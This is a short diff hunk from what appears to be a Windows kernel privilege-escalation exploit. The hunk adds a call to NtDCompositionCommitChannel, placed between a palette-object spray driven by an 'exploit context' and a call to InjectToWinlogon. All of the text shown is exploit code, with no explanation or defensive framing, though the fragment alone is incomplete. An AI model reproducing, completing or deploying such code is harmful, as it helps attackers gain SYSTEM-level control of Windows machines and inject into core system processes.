@@ -608,6 +608,6 @@ int main(int argc, TCHAR* argv[]) {
     {
         createPaletteofSize1(g_pExploitCtx->ObjectSize);
     }
-
+    NtDCompositionCommitChannel(hChannel, &dwArg1, &dwArg2, 0, NULL);
     InjectToWinlogon();
 }
